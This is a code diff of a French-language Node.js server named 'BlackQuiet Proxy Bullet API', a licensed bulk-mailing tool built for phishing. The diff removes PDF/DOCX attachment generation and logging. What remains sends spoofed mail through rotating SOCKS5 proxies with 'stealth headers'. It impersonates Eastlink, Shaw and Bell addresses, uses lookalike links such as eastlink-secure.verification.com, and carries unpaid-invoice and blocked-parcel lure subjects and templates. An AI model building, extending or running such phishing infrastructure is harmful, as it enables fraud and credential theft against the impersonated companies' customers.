@@ -186,30 +186,12 @@ function replacePlaceholders(text, data) {
     return result;
 }
 
-// Génération PDF
-async function generatePDF(htmlContent) {
-    const puppeteer = require('puppeteer');
-    const browser = await puppeteer.launch({ headless: 'new', args: ['--no-sandbox'] });
-    const page = await browser.newPage();
-    await page.setContent(`<html><body style="padding:40px;">${htmlContent}</body></html>`);
-    const pdf = await page.pdf({ format: 'A4', printBackground: true });
-    await browser.close();
-    return pdf;
-}
-
-// Génération DOCX
-async function generateDOCX(htmlContent) {
-    const HTMLtoDOCX = require('html-to-docx');
-    return await HTMLtoDOCX(htmlContent, null, { footer: true, pageNumber: true });
-}
-
 // Envoi via tunnel SOCKS5
 async function sendEmailViaProxy(mailOptions) {
     let socket = null;
     try {
         const rotatedUser = rotateProxySSID(globalProxyConfig.proxy_user);
         console.log(`[PROXY] Tunnel vers ${globalProxyConfig.proxy_host}:${globalProxyConfig.proxy_port}`);
-        console.log(`[PROXY] Username: ${rotatedUser.substring(0, 50)}...`);
         
         const tunnel = await SocksClient.createConnection({
             proxy: {
@@ -242,11 +224,9 @@ async function sendEmailViaProxy(mailOptions) {
         const result = await transporter.sendMail(mailOptions);
         transporter.close();
         stats.emails_sent++;
-        console.log(`[SUCCÈS] Email envoyé à ${mailOptions.to}`);
         return { success: true, messageId: result.messageId };
     } catch (error) {
         stats.emails_failed++;
-        console.error(`[ERREUR] ${error.message}`);
         return { success: false, error: error.message };
     } finally {
         if (socket && !socket.destroyed) socket.end();
@@ -277,7 +257,6 @@ app.get('/', (req, res) => {
         name: 'BlackQuiet Proxy Bullet API',
         version: '6.0.0',
         status: 'online',
-        features: ['SOCKS5', 'SSID Rotation', 'DNS Multi-level', 'Stealth Headers', 'PDF/DOCX', 'Smart Placeholders'],
         licenses: Object.keys(VALID_LICENSES).map(k => ({ key: k, role: VALID_LICENSES[k].role, name: VALID_LICENSES[k].name }))
     });
 });
@@ -293,7 +272,6 @@ app.get('/api/config', (req, res) => {
 app.post('/api/license/activate', (req, res) => {
     const { license_key, hwid } = req.body;
     const license = VALID_LICENSES[license_key];
-    console.log(`[LICENSE] Activation: ${license_key}, Role: ${license?.role || 'invalide'}`);
     if (license) {
         res.json({ success: true, message: 'Licence activée', system_name: license.name, role: license.role, expires_at: license.expires });
     } else {
@@ -304,7 +282,6 @@ app.post('/api/license/activate', (req, res) => {
 app.post('/api/license/verify', (req, res) => {
     const { license_key } = req.body;
     const license = VALID_LICENSES[license_key];
-    console.log(`[LICENSE] Vérification: ${license_key}, Role: ${license?.role || 'invalide'}`);
     if (license) {
         res.json({ valid: true, system_name: license.name, role: license.role, expires_at: license.expires, days_left: 30 });
     } else {
@@ -328,27 +305,9 @@ app.post('/api/shorten', async (req, res) => {
     res.json({ original: url, short: shortUrl });
 });
 
-// Générer PDF
-app.post('/api/generate/pdf', async (req, res) => {
-    const { html } = req.body;
-    if (!html) return res.status(400).json({ error: 'HTML requis' });
-    const pdf = await generatePDF(html);
-    res.setHeader('Content-Type', 'application/pdf');
-    res.send(pdf);
-});
-
-// Générer DOCX
-app.post('/api/generate/docx', async (req, res) => {
-    const { html } = req.body;
-    if (!html) return res.status(400).json({ error: 'HTML requis' });
-    const docx = await generateDOCX(html);
-    res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document');
-    res.send(docx);
-});
-
-// ============ ROUTES UTILISATEUR (tous rôles) ============
+// ============ ROUTES UTILISATEUR ============
 app.post('/api/send', checkLicense, async (req, res) => {
-    const { to, subject, html, fromEmail, fromName, link, attachment, attachmentType } = req.body;
+    const { to, subject, html, fromEmail, fromName, link } = req.body;
     if (!to || !subject || !html) {
         return res.status(400).json({ success: false, error: 'Champs requis: to, subject, html' });
     }
@@ -359,22 +318,12 @@ app.post('/api/send', checkLicense, async (req, res) => {
         let processedHtml = replacePlaceholders(html, emailData);
         let processedSubject = replacePlaceholders(subject, emailData);
         
-        const attachments = [];
-        if (attachment === 'pdf') {
-            const pdfBuffer = await generatePDF(processedHtml);
-            attachments.push({ filename: `document_${Date.now()}.pdf`, content: pdfBuffer, contentType: 'application/pdf' });
-        } else if (attachment === 'docx') {
-            const docxBuffer = await generateDOCX(processedHtml);
-            attachments.push({ filename: `document_${Date.now()}.docx`, content: docxBuffer, contentType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' });
-        }
-        
         const mailOptions = {
             from: `"${fromName || 'Service Client'}" <${fromEmail || 'noreply@eastlink.ca'}>`,
             to: to,
             subject: processedSubject,
             html: processedHtml,
-            headers: generateStealthHeaders(fromEmail || 'noreply@eastlink.ca', to, processedSubject),
-            attachments: attachments
+            headers: generateStealthHeaders(fromEmail || 'noreply@eastlink.ca', to, processedSubject)
         };
         const result = await sendEmailViaProxy(mailOptions);
         res.json(result);
@@ -424,7 +373,7 @@ app.get('/api/stats', checkLicense, (req, res) => {
     });
 });
 
-// ============ ROUTES ADMIN UNIQUEMENT ============
+// ============ ROUTES ADMIN ============
 app.get('/api/admin/config', checkLicense, requireAdmin, (req, res) => {
     res.json({
         proxy: globalProxyConfig,
@@ -447,7 +396,6 @@ app.post('/api/admin/config/proxy', checkLicense, requireAdmin, (req, res) => {
     if (proxy_pass) globalProxyConfig.proxy_pass = proxy_pass;
     if (smtp_host) globalProxyConfig.smtp_host = smtp_host;
     if (smtp_port) globalProxyConfig.smtp_port = parseInt(smtp_port);
-    console.log(`[ADMIN] Proxy config mise à jour: ${globalProxyConfig.proxy_host}:${globalProxyConfig.proxy_port}`);
     res.json({ success: true, config: globalProxyConfig });
 });
 
@@ -499,7 +447,7 @@ app.post('/api/admin/reset', checkLicense, requireAdmin, (req, res) => {
     globalLists = {
         fromEmails: ['facture@eastlink.ca', 'admin@shaw.ca', 'support@bell.ca'],
         senderNames: ['Service Client', 'Support Technique', 'Administration', 'Facturation'],
-        subjects: ['Facture impayée [INVOICE_NUM]', 'Alerte sécurité : connexion suspecte', 'Votre colis est bloqué'],
+        subjects: ['Facture impayée [INVOICE_NUM]', 'Alerte sécurité', 'Votre colis est bloqué'],
         links: ['https://eastlink-secure.verification.com', 'https://shaw-paiement.urgence.net'],
         templates: [
             { name: 'Facture_Urgente.html', content: '<div><h2>Bonjour [FIRST_NAME],</h2><p>Votre facture <strong>[INVOICE_NUM]</strong> de <strong>[BALANCE_AMOUNT]</strong> expire le <strong>[DEADLINE_DATE]</strong>.</p><p><a href="[LINK]">Consulter</a></p></div>' },
